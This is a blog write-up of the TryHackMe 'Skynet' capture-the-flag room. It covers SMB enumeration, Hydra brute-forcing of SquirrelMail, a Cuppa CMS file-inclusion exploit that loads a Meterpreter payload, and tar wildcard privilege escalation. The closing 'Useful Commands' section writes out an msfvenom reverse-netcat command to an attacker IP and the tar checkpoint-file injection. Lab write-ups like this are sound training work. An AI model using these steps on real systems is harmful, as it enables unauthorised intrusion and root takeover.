---
title: Skynet (Try Hack Me)
author: Robin Goyal
date: 2021-09-12 21:00 -0400
categories: [Cybersecurity, Writeups]
tags: [thm, ctf, writeup]
hidden: true
image:
  src: https://tryhackme-images.s3.amazonaws.com/room-icons/78628bbf76bf1992a8420cdb43e59f2d.jpeg
---

I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely communicate the pentest lifecycle.

## Enumeration

The first thing is to recognize the services that are available so we can identify a vulnerability or pathway into exploiting this target.

We'll kick things off with an nmap scan of the top 1000 ports.

![nmap](/assets/img/posts/thm-skynet/nmap-initial.jpg)

Open ports:
- 22 (SSH)
- 80 (HTTP)
- 110 (POP3)
- 139/445 (Samba)
- 143 (IMAP)

Let's explore each service in further detail.

### Samba

With open SMB ports, many sysadmins do not configure the services to prevent unauthenticated users to list the shares. Let's see if that's the case here.

![smbclient list](/assets/img/posts/thm-skynet/smbclient-listing.jpg)

There are two shares that might contain interesting data, anonymous and milesdyson.

The share, milesdyson, denied us access as we may need credentials to access that share. The anonymous share granted us unauthenticated access and contained some txt files!

![smb anon share](/assets/img/posts/thm-skynet/smb-anon-share.jpg)

There were two files that contained content, attention.txt and log1.txt. Let's dump the contents of the two files.

- attention.txt

```
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
```

- log1.txt

```
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator
```

The system requires all skynet employees to change their password but we also have a potential password list to use. This may be helpful for brute forcing SSH, POP3/IMAP, or even a protected endpoint in the web application.

With the only user that we have come across as "Miles Dyson", we could use an educated guess of "milesdyson" being a potentially valid username against the available services. Now, we can use Hydra with milesdyson and the potential password list against SSH, IMAP, and POP3. Unfortunately, the credentials were not valid for those services. There may be other username formats we could try but let's explore the web application before attempting more brute force attempts.

### HTTP
![landing page](/assets/img/posts/thm-skynet/landing-page.jpg)

Eerily similar to the Google search bar, the index page contains no functionality, no information in the source code, and the web application contains no robots.txt file.

#### Gobuster

![gobuster results](/assets/img/posts/thm-skynet/gobuster.jpg)

Checking out most of the endpoints led to Forbidden Access but the /squirrelmail endpoint led us to a login page!

![squirrelmail](/assets/img/posts/thm-skynet/squirrelmail.jpg)

Maybe hydra with the previous brute force attempts will work here!

#### Hydra

We need to capture two pieces of information, a failed authentication attempt and the request details.

For the failed authentication attempt, we'll throw some bogus credentials to search for some text indicating that the authentication attempt was a failure.

![Failed login](/assets/img/posts/thm-skynet/failed-login.jpg)

Next, let's capture the request in Burpsuite to understand the endpoint the request is being submitted to along with the request payload.

![Burp intercept](/assets/img/posts/thm-skynet/burpsuite.jpg)

So the request is being submitted to /squirrelmail/src/redirect.php and the we can see the payload variables being sent to the web server. Three of those variables should remain static in our Hydra attack and only secretkey should be variable.

![hydra](/assets/img/posts/thm-skynet/hydra.jpg)

Awesome! The hydra request is a bit lengthyl but it combines all of the information we have gathered swapping out the password for "^PASS^" so Hydra can populate it with the passwords from the password list.

#### Squirrel Mail

![inbox](/assets/img/posts/thm-skynet/inbox.jpg)

With access to milesdyson's inbox, there are three emails, one of which is a "system" generated email with his new Samba password while the other two contain no useful information.

```
We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`
```

We should now have access to his Samba share!

#### Samba

![smb miles login](/assets/img/posts/thm-skynet/smb-miles-login.jpg)

Within notes, there was a long list of files (mostly PDF), but one file stood out. Downloading this file onto my system, it contained the following content:

```
1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

There is a CMS available at that odd endpoint that we should check out!

#### CMS

![CMS index](/assets/img/posts/thm-skynet/cms-index.jpg)

There isn't much information present on this page or in the source. Gobuster could reveal some interesting endpoints hidden behind this CMS.

![CMS gobuster](/assets/img/posts/thm-skynet/gobuster-cms.jpg)

Woot! An administrator endpoint to check out!

![CMS administrator](/assets/img/posts/thm-skynet/cms-admin.jpg)

A login portal to the administrative section of the Cuppa CMS (this may be an actual CMS product).

*I thought we could obtain access through the credentials that got us access to Squirrelmail or the Samba share. I tried various combinations of usernames (milesdyson, admin, administrator) and the passwords from the password list but nothing worked.*

Authenticating to the administrative section did not pan out so let's see if there are any public exploits for the Cuppa CMS.

![searchsploit](/assets/img/posts/thm-skynet/searchsploit.jpg)

So the Cuppa CMS is vulnerable to LFI and RFI! Looking into the details of the vulnerability, the alertConfigField.php file accepts a parameter, urlConfig, that causes it. Let's try to access the /etc/passwd file.

![lfi passwd](/assets/img/posts/thm-skynet/lfi-passwd.jpg)

We've confirmed that this application is vulnerable to LFI. The application must be running as root since we couldn't access the /etc/shadow file.

*I spent a bit of time wondering if this was a dead end as I did not know how to use LFI to obtain our initial foothold. The exploit indicated that the CMS is also vulnerable to RFI. I haven't been exposed to RFI as much but while thinking about how it works, I wondered if the server could execute PHP code once it downloads it from our attacker system.*

## Initial Foothold

Reading more about RFI on [this article](https://www.hackingarticles.in/comprehensive-guide-on-remote-file-inclusion-rfi/), they confirmed my assumption.

Using msfvenom to generate a Meterpereter payload, I created a rev-shell.php file and served the file using Python's http.server module.

Next, we need to configure a Metasploit handler to send the second stage Meterpreter payload. With all of that configured, let's send the RFI request in the browser and cross our fingers.

![meterpreter](/assets/img/posts/thm-skynet/meterpreter.jpg)

We obtained a Meterpreter shell! In the browser address, we send the request for the rev-shell.php file which also shows up in the Python web server logs. On the right, the Metasploit handler sends the 2nd stage Meterpreter payload which opens up the Meterpreter session.

Within the Meterpreter session, let's browse to miledyson's home directory for the user flag.

![user flag](/assets/img/posts/thm-skynet/user-flag.jpg)

User Flag: `7ce5c2109a40f958099283600a9ae807`

## Privilege Escalation

One interesting thing that I noticed in milesdyson's home directory is the backups folder. Within the directory which is world readable is a backups.sh and backup.tgz file.

![Backups](/assets/img/posts/thm-skynet/backups.jpg)

Looking at the timing of backup.tgz, the file has been updated very recently which means that there may be a cron job for this backup.

![crontab](/assets/img/posts/thm-skynet/crontab.jpg)

From the contents of the /etc/crontab file, there is a cron task to run the backup.sh script every minute as root.

Outputting the contents of the backup.sh file:

```
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

The wildcard path for tar is vulnerable to a privilege escalation technique that's documented very well in this [article](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/).

The way this vulnerability works is that we need to create three files, two of which are named in the same format as command line parameters to tar, and one file being a reverse shell payload.

The two command line parameters are `--checkpoint=1` and `--checkpoint-action=exec=sh <filename>`. At every checkpoint, tar will exec the command provided and since root is running the backup script, the checkpoint-action script will be executed as root. Therefore, we can provide a reverse shell payload as the script to execute which will connect back to our netcat listener with a root shell.

I'll provide the exact steps in the Useful Commands section but the following image show the captured shell on port 5555 as root.

![root shell](/assets/img/posts/thm-skynet/root-shell.jpg)

We can grab the root flag!

![root flag](/assets/img/posts/thm-skynet/root-flag.jpg)

We have completed this room!

## Useful Commands

### Tar WildCard Privesc

Generate a reverse netcat payload using msfvenom.

`msfvenom -p cmd/unix/reverse_netcat LHOST=10.6.5.103 LPORT=5555`

Cop the generated payload and save it as `shell.sh` in the folder that the tar command is generating a tar file of.

Create the two "files" that will act as the command line parameters for the tar command.

```
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```

Set up a netcat listener on port 5555 and wait for the cron task to be done or execute the tar command yourself if SUID is enabled.

## Reflection

Of the category of easy rooms that I have completed on Try Hack Me so far, this probably falls on the higher end of the spectrum. This was definitely a challenging room with many vectors that could have led to rabbit holes.

The previous few rooms I have completed so far have not been finished without some help from a hint on Try Hack Me. Learning from my prior roadblocks, I was determined to do as much due diligence as possible and explore each vector as much as possible without hints. The persistence worked off as I completed this room and learned along the way.

I thoroughly enjoy the themed rooms on THM and this was no exception. There are a ton of opportunities to learn about tools and exploitation techniques including gobuster, hydra, smb, remote file inclusion, and tar privilege escalation.
